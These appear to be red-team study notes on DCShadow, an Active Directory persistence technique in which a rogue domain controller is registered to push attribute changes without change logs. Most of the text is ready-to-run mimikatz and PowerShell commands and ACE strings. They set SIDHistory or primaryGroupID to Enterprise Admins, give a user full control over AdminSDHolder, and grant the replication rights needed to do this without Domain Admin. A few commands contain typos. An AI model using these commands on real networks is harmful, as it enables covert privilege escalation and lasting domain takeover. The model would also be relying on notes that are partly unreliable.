# Forest Persistence - DCShadow

* dcshadow temporarily registered a new domain controller in the target domain and it uses it to "push" attributes like SIDHistory, SPNs etc. on specified objects without leaving the change log modified object
* the new dc is registered by modifying the configuration container, spns of an existing computer object and couple of rpc services.
* because the attributes are changed from a "dc", there are no directory change logs on the actual dc for the target object
* by default, DA privs are required to use dcshadow
* in the following examples, the attackers machine is part of the root domain

* https://www.dcshadow.com

* use mimikatz for dcshadow. two mimikatz instances are required.
* one to start rpc servers with systems privs and specify attributes to be modified
```powershelll
!+
!processtoken
lsadump::dcshadow /object:rootuser /attribute:Description /value="sigh"
```

* second with enough privs; DA; to push the values.
```powershell
lsadump::dcshadow /push
```


<br>

## dcshadow minimal permissions

* dcshadow can be used with minimal permission by modifying acls of:
  * the domain object
    * DS-Install-Replica (add/remove replica in domain)
    * DS-Replication-Manage-Topology (manage replication topology)
    * DS-Replication-Synchronize (replication synchronization)
  
  * the sites object (and its children) in the configuration container
    * CreateChild and DeleteChild

  * the object of the computer which is registered as a dc
    * WriteProperty (NotWrite)

  * the target object
    * WriteProperty (NotWrite)

* able to use Set-DCShadowPermissions from the below repo for setting permissions
https://github.com/samratashok/nishang

#### example, use dcshadow as user1 to modify root1 object from machine user1-pc 
```powershell
Set-DCShadowPermissions -FakeDC user1-pc -SAMAccountName root1 -Username user1 -Verbose
```

* the second mimikatz instance which runs as DA is not needed.


<br>

## dcshadow

* permissions sorted out, interesting things can happen
#### example, set sidhistory of a user account to enterprise admins or domain admins group
```powershell
lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-519
```

#### use above without da
```powershell
Set-DCShadowPermissions -FakeDC user1-pc -SAMAccountName root1 -Username user1 -Verbose
```

#### set primarygroupid of a user to enterprise or domain admins group
```powershell
lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
```

* note that after the above command is used, the user shows up as a member of the enterprise admins group in some enum commands, example "net group "Enterprise Admins" /domain"


#### modify ntSecurityDescriptor for AdminSDHolder to add full control for a user
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain1,DC=local")).psbase.ObjectSecurity.sddl
```

#### append a full control ace from above for sy/ba/da with our users sid at the end
```powershell
lsadump::dcshadow /pbject:CN=AdminSDHolder,CN=System,DC=domain1,DC=local /attribute:ntSecurityDescriptor /value:modified_acl
```


<br>

## dcshadow within dcshadow

* you can run dcshadow from dcshadow
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain1,DC=local")).psbase.ObjectSecurity.sddl
```

* append following aces with our users sid at the end

#### on the domain object
```
(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;usersid)
(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;usersid)
(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;usersid)
```

#### on the attacker computer object
```
(A;;WP;;;;userid)
```

#### on the target user object
```
(A;;WP;;;userid)
```

#### on the sites object in configuration container
```
(A;CI;CCDC;;;;userid)
```

* if we maintain access to the computer for which we modified the permissions with the user whose sid we added, we can modify the attributes of the specific user whos permissions we modified















































